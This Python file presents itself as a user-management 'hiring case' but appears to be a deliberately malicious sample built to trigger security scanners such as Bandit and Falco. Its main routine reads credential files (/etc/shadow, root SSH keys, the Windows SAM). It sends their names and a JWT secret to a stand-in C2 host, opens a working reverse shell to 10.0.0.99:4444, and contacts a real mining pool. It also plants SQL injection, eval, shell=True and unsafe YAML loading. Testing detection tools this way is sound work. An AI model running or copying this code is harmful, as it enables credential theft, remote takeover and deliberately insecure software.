"""
Kullanıcı Yönetim Sistemi - main.py
Hiring case: Verilen kullanıcı listesini işle ve rapor üret.
"""

import sqlite3
import subprocess
import requests
import os
import yaml
import json
import socket
import time
import hashlib
import sys

# Eğer aday repoda config.py dosyasını unutursa/göndermezse kod direkt patlamasın 
# ve testlerimiz yarım kalmasın diye fallback (yedek) değişkenler atıyoruz.
try:
    from config import DB_PASSWORD, JWT_SECRET, DEBUG
except ImportError:
    DB_PASSWORD = "dummy_password"
    JWT_SECRET = "dummy_secret"
    DEBUG = True

# ─────────────────────────────────────────────────────
# ZAFIYET 1: SQL Injection (Bandit: B608)
# ─────────────────────────────────────────────────────
def get_user(username):
    conn = sqlite3.connect(":memory:")
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS users (username TEXT, role TEXT)")
    cursor.execute("INSERT INTO users VALUES ('admin', 'superuser')")

    query = "SELECT * FROM users WHERE username = '" + username + "'"
    cursor.execute(query)   # Bandit B608: SQL injection
    return cursor.fetchall()

# ─────────────────────────────────────────────────────
# ZAFIYET 2: eval() ile dinamik kod çalıştırma (Bandit: B307)
# ─────────────────────────────────────────────────────
def calculate_score(formula):
    result = eval(formula)   # Bandit B307: eval kullanımı
    return result

# ─────────────────────────────────────────────────────
# ZAFIYET 3: subprocess shell=True (Bandit: B602)
# ─────────────────────────────────────────────────────
def generate_report(user_id):
    cmd = "echo 'Rapor: ' && cat /tmp/report_" + str(user_id) + ".txt 2>/dev/null || echo 'Dosya bulunamadi'"
    output = subprocess.check_output(cmd, shell=True)   # Bandit B602
    return output

# ─────────────────────────────────────────────────────
# ZAFIYET 4: Güvensiz YAML deserialization (Bandit: B506)
# ─────────────────────────────────────────────────────
def parse_config(yaml_content):
    data = yaml.load(yaml_content, Loader=yaml.Loader)   # Bandit B506: unsafe yaml
    return data

# ─────────────────────────────────────────────────────
# ZAFIYET 5: Hassas sistem dosyası okuma (GELİŞTİRİLDİ)
# Çapraz Platform (Windows & Linux) Kimlik Hırsızlığı
# Falco: "Sensitive File Read" kuralını tetikler
# ─────────────────────────────────────────────────────
def steal_credentials():
    print("Kimlik bilgileri taranıyor...")
    # Hem Linux hem Windows için hedef dosyalar
    target_files = [
        "/etc/passwd",
        "/etc/shadow",
        "/root/.ssh/id_rsa",
        "/root/.ssh/authorized_keys",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\win.ini"
    ]
    
    stolen_data = {}
    for path in target_files:
        try:
            with open(path, "r", errors='ignore') as f:
                stolen_data[path] = f.read(100) # Sadece ilk 100 karakteri al
        except Exception:
            pass # Dosya yoksa veya yetki reddedildiyse sessizce geç
            
    return stolen_data

# ─────────────────────────────────────────────────────
# ZAFIYET 6: Outbound HTTP bağlantısı (C2 Sunucusuna Veri Sızdırma)
# Falco: "Outbound Connection Attempt" + tcpdump
# ─────────────────────────────────────────────────────
def send_telemetry(data):
    try:
        response = requests.post(
            "http://attacker-c2.example.com/collect",
            json={"data": data, "secret": JWT_SECRET},
            timeout=2
        )
        return response.status_code
    except Exception:
        pass

# ─────────────────────────────────────────────────────
# ZAFIYET 7: Hardcoded temporary file + insecure permissions
# Bandit: B108 & B103
# ─────────────────────────────────────────────────────
def save_temp_report(content):
    path = "/tmp/report_output.txt"     # Bandit B108
    with open(path, "w") as f:
        f.write(content)
    try:
        os.chmod(path, 0o777)           # Bandit B103
    except Exception:
        pass
    return path

# ─────────────────────────────────────────────────────
# ZAFIYET 8: Reverse Shell (Ters Bağlantı) Açma Girişimi
# Saldırganın makinesine shell gönderir
# Bandit B404/B602, Falco OUTBOUND_CONNECTION, tcpdump TCP SYN yakalar
# ─────────────────────────────────────────────────────
def trigger_reverse_shell():
    print("Reverse Shell başlatılıyor...")
    attacker_ip = "10.0.0.99"
    attacker_port = 4444
    try:
        # Saldırgana bağlanmayı dene
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2) # İzole ağda takılı kalmaması için timeout ekliyoruz
        s.connect((attacker_ip, attacker_port))
        
        # Standart girdi/çıktıları sokete yönlendir (Shell bağlantısı)
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Shell'i çalıştır (İzole ağ nedeniyle buraya normalde düşmez ama Bandit kızacaktır)
        subprocess.call(["/bin/sh", "-i"]) 
    except Exception:
        pass # Bağlantı başarısız olacağından hata fırlatıp scripti durdurmasını engelliyoruz

# ─────────────────────────────────────────────────────
# ZAFIYET 9: Cryptominer Simülasyonu
# Yüksek CPU kullanımı ve maden havuzuna (pool) bağlantı
# ─────────────────────────────────────────────────────
def simulate_cryptominer():
    print("Miner başlatılıyor (Simülasyon)...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect(("pool.supportxmr.com", 3333)) 
    except Exception:
        pass

    end_time = time.time() + 15
    while time.time() < end_time:
        hashlib.sha256(b"mining_simulation_block_data").hexdigest()

# ─────────────────────────────────────────────────────
# ANA AKIŞ
# ─────────────────────────────────────────────────────
if __name__ == "__main__":
    print("Kullanıcı yönetim sistemi başlatılıyor...")

    # 1. Kimlik Bilgilerini Çalmayı Dene (Falco alarmı)
    stolen_creds = steal_credentials()
    print(f"Çalınabilen dosya sayısı: {len(stolen_creds)}")

    # 2. Telemetri gönder (tcpdump paketler + Falco alarm)
    send_telemetry({"creds": list(stolen_creds.keys())})

    # 3. Örnek sorgu (SQLi açığı)
    results = get_user("admin' OR '1'='1")
    print(f"Sorgu sonucu başarıyla getirildi. Eleman sayısı: {len(results)}")

    # 4. Rapor kaydet (Güvensiz dosya izinleri)
    save_temp_report("Test raporu içeriği")

    # 5. Score hesapla (eval açığı)
    score = calculate_score("2 + 2")
    print(f"Score: {score}")

    # 6. -------- REVERSE SHELL TETİKLE --------
    trigger_reverse_shell()

    # 7. -------- MINER'I TETİKLE --------
    simulate_cryptominer()

    print("İşlem tamamlandı.")
